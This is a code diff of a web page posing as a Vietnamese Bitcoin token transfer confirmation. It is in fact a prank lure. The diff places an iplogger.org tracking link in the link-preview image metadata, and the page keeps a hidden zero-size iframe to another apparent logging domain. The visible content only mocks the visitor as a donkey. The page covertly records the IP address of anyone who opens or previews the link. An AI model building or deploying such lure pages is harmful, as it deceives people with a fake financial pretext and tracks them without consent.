@@ -6,7 +6,7 @@ export default function Home() {
     icon: 'https://pasteboard.co/K9NJGSf.x-icon',
     title: 'Xác nhận chuyển khoản Bitcoin Token',
     url: 'https://mongker.cf/',
-    image: 'https://www.pngkit.com/png/detail/9-90785_bitcoin-png-transparent-image-gold-bitcoin-coin-png.png',
+    image: 'https://iplogger.org/26TPj6',
     description: 'Đây là token xác nhận chuyển khoản token Bitcoin để xác nhận giao dịch',
   };
   return (
@@ -32,7 +32,7 @@ export default function Home() {
         <meta property="og:image:height" content="480" />
       </Head>
       <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', flexDirection: 'column' }}>
-        <img src={'https://iplogger.org/26TPj6'} />
+        <img src={'https://4.bp.blogspot.com/-k1PJp9KaaWE/XLKZLRgtdtI/AAAAAAAAC_U/gLX9_hMoI8ktHnKXCaGmHdXTeU0gLyyXwCLcBGAs/s400/l%25E1%25BB%25ABa.jpg'} />
         <iframe src='https://maper.info/X6wai' height={0} width={0} />
         <h1>Đồ con lừa !!!! Ahihi</h1>
       </div >
